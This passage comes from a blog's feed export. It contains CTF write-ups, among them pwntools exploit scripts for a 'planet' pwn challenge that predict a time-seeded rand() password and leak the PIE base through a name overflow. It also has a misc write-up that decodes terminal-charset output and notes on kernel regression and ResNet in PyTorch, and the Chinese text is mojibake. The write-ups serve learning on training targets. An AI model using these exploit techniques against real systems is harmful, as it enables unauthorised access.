class="hljs-number">0</span>)<br>libc.srand(seed)<br>num1=libc.rand()<br> <br>p.sendlineafter(<span class="hljs-string">b&#x27;Give me some gift?(0/1)\n&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Guess the number\n&#x27;</span>,<span class="hljs-built_in">str</span>(num1))<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>fmt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStar2023 pwn planet</title>
    <link href="/2023/11/26/ctf-pwn/newstar2023week5/"/>
    <url>/2023/11/26/ctf-pwn/newstar2023week5/</url>
    
    <content type="html"><![CDATA[<h2 id="planet"><a href="#planet" class="headerlink" title="planet"></a>planet</h2><p><a href="https://buuoj.cn/match/matches/190/challenges#planet">https://buuoj.cn/match/matches/190/challenges#planet</a></p><h4 id="exp1-æ³„éœ²éšæœºæ•°"><a href="#exp1-æ³„éœ²éšæœºæ•°" class="headerlink" title="exp1 æ³„éœ²éšæœºæ•°"></a>exp1 æ³„éœ²éšæœºæ•°</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28513</span>)<br>elf = ELF(<span class="hljs-string">&#x27;putsorsys&#x27;</span>)<br><br>libc=cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;Passwd: &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;secret_passwd_anti_bad_guys&quot;</span>)<br><br>seed=libc.time(<span class="hljs-number">0</span>)<br>libc.srand(seed)<br>p.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;Admin&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">55</span>):<br>    libc.rand()<br><br>passwd = <span class="hljs-string">&#x27;&#x27;</span><br>alpha = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>passwd = passwd + alpha[libc.rand() % <span class="hljs-number">26</span>]<br><br>p.sendline(passwd.encode())<br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="exp2-æ³„éœ²PIE"><a href="#exp2-æ³„éœ²PIE" class="headerlink" title="exp2 æ³„éœ²PIE"></a>exp2 æ³„éœ²PIE</h4><p>è®©å­—æ¯è¡¨å…¨å˜æˆAï¼Œä¸ç®¡æ€ä¹ˆéšæœºéƒ½æ˜¯ä¸€æ ·çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28513</span>)<br>elf = ELF(<span class="hljs-string">&#x27;putsorsys&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;Passwd: &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;secret_passwd_anti_bad_guys&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;Rename&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Enter the new name&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">16</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;GetName&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">16</span>)<br>s = u64(p.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(s))<br><br>PIE = s - <span class="hljs-number">0x40D0</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;Rename&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Enter the new name&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">24</span> + p64(PIE + <span class="hljs-number">0x40E0</span>))<br><br>p.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;Jump&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;Rename&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Enter the new name&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">26</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;Admin&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">30</span>)<br>p.interactive()<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>random-leak</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023.11 æœˆèµ›</title>
    <link href="/2023/11/25/ctf-misc/2023.11%E6%9C%88%E8%B5%9B/"/>
    <url>/2023/11/25/ctf-misc/2023.11%E6%9C%88%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h2><p>ç”¨linux fileå‘½ä»¤æŸ¥çœ‹æ–‡ä»¶æ ¼å¼</p><p><code>./file.bin: NES ROM image (iNES): 2x16k PRG, 1x8k CHR [V-mirror] [SRAM]</code></p><p>ç”¨VirtualNESæ‰“å¼€ï¼Œå‘ç°æ˜¯ä¸ª2048æ¸¸æˆ</p><p>æ¸¸æˆè®°å½•å½“å‰æœ€é«˜çš„æ•°å€¼ï¼ŒçŒœæµ‹æŠŠä»–æ”¹å¤§ä¸€ç‚¹å°±èƒ½èƒœåˆ©</p><p>æ‰“å¼€é‡‘æ‰‹æŒ‡ï¼ŒæŸ¥æ‰¾2ï¼Œç„¶ååœ¨æ¸¸æˆé‡ŒæŠŠcurrent max is å˜æˆ4ï¼Œç„¶åæ›´æ–°æŸ¥æ‰¾ï¼Œç„¶åå˜æˆ8ï¼Œåœ¨æ›´æ–°æŸ¥æ‰¾â€¦</p><p>å‘ç°6000å’Œ6058è¿™ä¸¤ä¸ªåœ°å€ï¼Œç›´æ¥æ”¹æˆ2048ï¼Œæ¸¸æˆé€šè¿‡äº†æ‹¿åˆ°flag</p><h2 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@abaaba:~# ls -l<br>æ€»è®¡ 1<br>-rw-rw-r-- 1 root root   43 11æœˆ 24 09:57 flag<br>root@kali:~/# echo $&#x27;\e(0&#x27;<br><br>â¼âºâºâ”œ@â–’â‰â–’â–’â‰â–’:Â·# <br>â¼âºâºâ”œ@â–’â‰â–’â–’â‰â–’:Â·# âŒâ–’â”œ Â°â”Œâ–’Â±<br>Â°â”Œâ–’Â±Ï€8757â‰â88-Â°95â‰-4233-9722-âŠâ‰6461554â–’09Â£<br>â¼âºâºâ”œ@â–’â‰â–’â–’â‰â–’:Â·# <br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><figcaption><span>$'\e(0'``` ç»™å‘½ä»¤è¡Œåç»­çš„è¾“å‡ºå†…å®¹éƒ½è¿›è¡Œäº†ä¸€ä¸ªç¼–ç ï¼Œç»è¿‡åœ¨è‡ªå·±çš„kaliä¸Šæµ‹è¯•ï¼Œå‘ç°1234567890-</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs echo"><br>```shell<br>â–’:a<br>â‰:b<br>âŒ:c<br>â:d<br>âŠ:e<br>Â°:f<br>Â±:g<br><br>:h<br>â‹:i<br>â”˜:j<br>â”:k<br>â”Œ:l<br>â””:m<br>â”¼:n<br>âº:o<br>â»:p<br>â”€:q<br>â¼:r<br>â½:s<br>â”œ:t<br>â”¤:u<br>â”´:v<br>â”¬:w<br>â”‚:x<br>â‰¤:y<br>â‰¥:z<br>Ï€:&#123;<br>Â£:&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·çœ‹ç€å¯èƒ½ä¸æ˜¯å¾ˆç›´è§‚ï¼Œæ¢æˆ16è¿›åˆ¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x96\x92&#x27;</span>, <br><span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x90\x89&#x27;</span>,<br><span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x90\x8c&#x27;</span>, <br><span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x90\x8d&#x27;</span>, <br><span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x90\x8a&#x27;</span>, <br><span class="hljs-string">&#x27;f&#x27;</span>: <span class="hljs-string">b&#x27;\xc2\xb0&#x27;</span>, <br><span class="hljs-string">&#x27;g&#x27;</span>: <span class="hljs-string">b&#x27;\xc2\xb1&#x27;</span>, <br><span class="hljs-string">&#x27;h&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x90\xa4&#x27;</span>, <br><span class="hljs-string">&#x27;i&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x90\x8b&#x27;</span>, <br><span class="hljs-string">&#x27;j&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\x98&#x27;</span>, <br><span class="hljs-string">&#x27;k&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\x90&#x27;</span>, <br><span class="hljs-string">&#x27;l&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\x8c&#x27;</span>, <br><span class="hljs-string">&#x27;m&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\x94&#x27;</span>, <br><span class="hljs-string">&#x27;n&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\xbc&#x27;</span>, <br><span class="hljs-string">&#x27;o&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x8e\xba&#x27;</span>, <br><span class="hljs-string">&#x27;p&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x8e\xbb&#x27;</span>, <br><span class="hljs-string">&#x27;q&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\x80&#x27;</span>, <br><span class="hljs-string">&#x27;r&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x8e\xbc&#x27;</span>, <br><span class="hljs-string">&#x27;s&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x8e\xbd&#x27;</span>, <br><span class="hljs-string">&#x27;t&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\x9c&#x27;</span>, <br><span class="hljs-string">&#x27;u&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\xa4&#x27;</span>, <br><span class="hljs-string">&#x27;v&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\xb4&#x27;</span>, <br><span class="hljs-string">&#x27;w&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\xac&#x27;</span>, <br><span class="hljs-string">&#x27;x&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x94\x82&#x27;</span>, <br><span class="hljs-string">&#x27;y&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x89\xa4&#x27;</span>, <br><span class="hljs-string">&#x27;z&#x27;</span>: <span class="hljs-string">b&#x27;\xe2\x89\xa5&#x27;</span>,<br><span class="hljs-string">&#x27;&#123;&#x27;</span>: <span class="hljs-string">b&#x27;\xcf\x80&#x27;</span>, <br><span class="hljs-string">&#x27;&#125;&#x27;</span>: <span class="hljs-string">b&#x27;\xc2\xa3&#x27;</span><br></code></pre></td></tr></table></figure><p>æ¨æµ‹é¢˜ç›®æ˜¯åœ¨cat flagï¼Œ</p><p>ç„¶åæŠŠé‚£ä¸€è¡Œçš„åå…­è¿›åˆ¶æå–å‡ºæ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.txt&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>f.readline()<br><span class="hljs-string">b&#x27;root@abaaba:~# ls -l\r\n&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>f.readline()<br><span class="hljs-string">b&#x27;\xe6\x80\xbb\xe8\xae\xa1 1\r\n&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>f.readline()<br><span class="hljs-string">b&#x27;-rw-rw-r-- 1 root root   43 11\xe6\x9c\x88 24 09:57 flag\r\n&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>f.readline()<br><span class="hljs-string">b&quot;root@kali:~/# echo $&#x27;\\e(0&#x27;\r\n&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>f.readline()<br><span class="hljs-string">b&#x27;\r\n&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>f.readline()<br><span class="hljs-string">b&#x27;\xe2\x8e\xbc\xe2\x8e\xba\xe2\x8e\xba\xe2\x94\x9c@\xe2\x96\x92\xe2\x90\x89\xe2\x96\x92\xe2\x96\x92\xe2\x90\x89\xe2\x96\x92:\xc2\xb7# \r\n&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>f.readline()<br><span class="hljs-string">b&#x27;\xe2\x8e\xbc\xe2\x8e\xba\xe2\x8e\xba\xe2\x94\x9c@\xe2\x96\x92\xe2\x90\x89\xe2\x96\x92\xe2\x96\x92\xe2\x90\x89\xe2\x96\x92:\xc2\xb7# \xe2\x90\x8c\xe2\x96\x92\xe2\x94\x9c \xc2\xb0\xe2\x94\x8c\xe2\x96\x92\xc2\xb1\r\n&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>f.readline()<br><span class="hljs-string">b&#x27;\xc2\xb0\xe2\x94\x8c\xe2\x96\x92\xc2\xb1\xcf\x808757\xe2\x90\x89\xe2\x90\x8d88-\xc2\xb095\xe2\x90\x89-4233-9722-\xe2\x90\x8a\xe2\x90\x896461554\xe2\x96\x9209\xc2\xa3\r\n&#x27;</span><br></code></pre></td></tr></table></figure><p>ç¬¬8æ¬¡readlineå°±æ˜¯flagçš„å†…å®¹ï¼Œç„¶åè¿›è¡Œæ›¿æ¢ï¼Œæ‹¿åˆ°flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">flag&#123;8757bd88-f95b-4233-9722-eb6461554a09&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Attention</title>
    <link href="/2023/11/22/ai/attention/"/>
    <url>/2023/11/22/ai/attention/</url>
    
    <content type="html"><![CDATA[<h3 id="Nadaraya-Watsonæ ¸å›å½’"><a href="#Nadaraya-Watsonæ ¸å›å½’" class="headerlink" title="Nadaraya-Watsonæ ¸å›å½’"></a>Nadaraya-Watsonæ ¸å›å½’</h3><p>$$<br>f(x)=\sum_{i=1}^{n} \frac{K(x-x_{i})}{\sum_{j=1}^{n}K(x-x_{j})} y_{i}<br>$$</p><p>å¦‚æœæ ¸å‡½æ•° $ K(x-x_{i}) $ è¶Šå¤§ï¼Œåˆ™å¯¹åº”çš„ $y_i$ çš„æƒé‡è¶Šå¤§</p><p>æ ¸å‡½æ•°ä¸º $ K(x-x_{i}) $ä¸ºé«˜æ–¯æ ¸å‡½æ•°æ—¶<br>$$<br>K(u)=\frac{1}{\sqrt{2\pi} } \exp{(-\frac{u^{2}}{2})}<br>$$<br>ä»£å…¥ä¼šå¾—åˆ°<br>$$<br>f(x)=\sum_{i=1}^{n} softmax(-\frac{1}{2}(x-x_i)^2)y_i<br>$$<br>è€Œé«˜æ–¯æ ¸å‡½æ•°xä¸$x_i$è¶Šæ¥è¿‘ï¼Œæ ¸å‡½æ•°çš„å€¼è¶Šå¤§ï¼Œæ ¹æ®å‰æ–‡ï¼Œ$y_i$çš„æƒé‡è¶Šå¤§</p><p>Nadaraya-Watsonæ ¸å›å½’æ˜¯ä¸€ä¸ªéå‚æ¨¡å‹</p><h4 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h4><p>é¢„æµ‹ $y_i = 2sin(x_i)+x_i^{0.8} +\epsilon $ å‡½æ•°</p>]]></content>
    
    
    <categories>
      
      <category>pytorch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pytorch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ResNet</title>
    <link href="/2023/11/21/ai/ResNet/"/>
    <url>/2023/11/21/ai/ResNet/</url>
    
    <content type="html"><![CDATA[<h3 id="Residual-Blockä½œç”¨ï¼š"><a href="#Residual-Blockä½œç”¨ï¼š" class="headerlink" title="Residual Blockä½œç”¨ï¼š"></a>Residual Blockä½œç”¨ï¼š</h3><p>æ€»ä¹‹ï¼Œæ·»åŠ çš„æ–°ç½‘ç»œå±‚è‡³å°‘ä¸ä¼šä½¿æ•ˆæœæ¯”åŸæ¥å·®ï¼Œå°±å¯ä»¥è¾ƒä¸ºç¨³å®šåœ°é€šè¿‡åŠ æ·±å±‚æ•°æ¥æé«˜æ¨¡å‹çš„æ•ˆæœäº†ã€‚</p><h3 id="ä¸ºä»€ä¹ˆå¯ä»¥é¿å…æ¢¯åº¦æ¶ˆå¤±ï¼š"><a href="#ä¸ºä»€ä¹ˆå¯ä»¥é¿å…æ¢¯åº¦æ¶ˆå¤±ï¼š" class="headerlink" title="ä¸ºä»€ä¹ˆå¯ä»¥é¿å…æ¢¯åº¦æ¶ˆå¤±ï¼š"></a>ä¸ºä»€ä¹ˆå¯ä»¥é¿å…æ¢¯åº¦æ¶ˆå¤±ï¼š</h3><p>æ±‚æ¢¯åº¦ï¼Œæ ¹æ®é“¾å¼æ³•åˆ™éœ€è¦ä¸€ç›´å‘å‰ç´¯ä¹˜ï¼Œåªè¦å…¶ä¸­çš„ä»»ä½•ä¸€ä¸ªå› æ•°è¿‡å°å°±ä¼šå¯¼è‡´æ±‚å‡ºæ¥çš„æ¢¯åº¦å¾ˆå°å¾ˆå°ï¼Œè¿™ä¸ªå°æ¢¯åº¦å°±ç®—ä¹˜ä»¥å†å¤§çš„å­¦ä¹ ç‡ä¹Ÿæ˜¯æ— æµäºäº‹</p><p>æœ‰äº†æ®‹å·®è¾¹ç®¡é€šè¿‡é“¾å¼æ³•åˆ™èµ°æ­£å¸¸è·¯çº¿å¾—åˆ°çš„æ¢¯åº¦å¤šä¹ˆå°ï¼Œä¸¤æ¡è·¯çº¿ç›¸åŠ çš„ç»“æœéƒ½ä¸ä¼šå°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> torch.utils <span class="hljs-keyword">import</span> data<br><span class="hljs-keyword">import</span> torchvision<br><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> transforms<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><span class="hljs-keyword">from</span> torch.nn <span class="hljs-keyword">import</span> functional <span class="hljs-keyword">as</span> F<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">import</span> time<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Residual</span>(nn.Module): <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, input_channels, num_channels, use_1x1conv=<span class="hljs-literal">False</span>, strides=<span class="hljs-number">1</span></span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        self.conv1 = nn.Conv2d(input_channels, num_channels, kernel_size=<span class="hljs-number">3</span>, padding=<span class="hljs-number">1</span>, stride=strides)<br>        self.conv2 = nn.Conv2d(num_channels, num_channels, kernel_size=<span class="hljs-number">3</span>, padding=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> use_1x1conv:<br>            self.conv3 = nn.Conv2d(input_channels, num_channels, kernel_size=<span class="hljs-number">1</span>, stride=strides)<br>        <span class="hljs-keyword">else</span>:<br>            self.conv3 = <span class="hljs-literal">None</span><br>        self.bn1 = nn.BatchNorm2d(num_channels)<br>        self.bn2 = nn.BatchNorm2d(num_channels)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, X</span>):<br>        Y = F.relu(self.bn1(self.conv1(X)))<br>        Y = self.bn2(self.conv2(Y))<br>        <span class="hljs-keyword">if</span> self.conv3:<br>            X = self.conv3(X)<br>        Y += X<br>        <span class="hljs-keyword">return</span> F.relu(Y)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">b1 = nn.Sequential(nn.Conv2d(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>, kernel_size=<span class="hljs-number">7</span>, stride=<span class="hljs-number">2</span>, padding=<span class="hljs-number">3</span>),<br>                   nn.BatchNorm2d(<span class="hljs-number">64</span>), nn.ReLU(),<br>                   nn.MaxPool2d(kernel_size=<span class="hljs-number">3</span>, stride=<span class="hljs-number">2</span>, padding=<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">resnet_block</span>(<span class="hljs-params">input_channels, num_channels, num_residuals,</span><br><span class="hljs-params">                 first_block=<span class="hljs-literal">False</span></span>):<br>    blk = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_residuals):<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> first_block:<br>            blk.append(Residual(input_channels, num_channels,<br>                                use_1x1conv=<span class="hljs-literal">True</span>, strides=<span class="hljs-number">2</span>))<br>        <span class="hljs-keyword">else</span>:<br>            blk.append(Residual(num_channels, num_channels))<br>    <span class="hljs-keyword">return</span> blk<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">b2 = nn.Sequential(*resnet_block(<span class="hljs-number">64</span>, <span class="hljs-number">64</span>, <span class="hljs-number">2</span>, first_block=<span class="hljs-literal">True</span>))<br>b3 = nn.Sequential(*resnet_block(<span class="hljs-number">64</span>, <span class="hljs-number">128</span>, <span class="hljs-number">2</span>))<br>b4 = nn.Sequential(*resnet_block(<span class="hljs-number">128</span>, <span class="hljs-number">256</span>, <span class="hljs-number">2</span>))<br>b5 = nn.Sequential(*resnet_block(<span class="hljs-number">256</span>, <span class="hljs-number">512</span>, <span class="hljs-number">2</span>))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">net = nn.Sequential(b1, b2, b3, b4, b5,<br>                  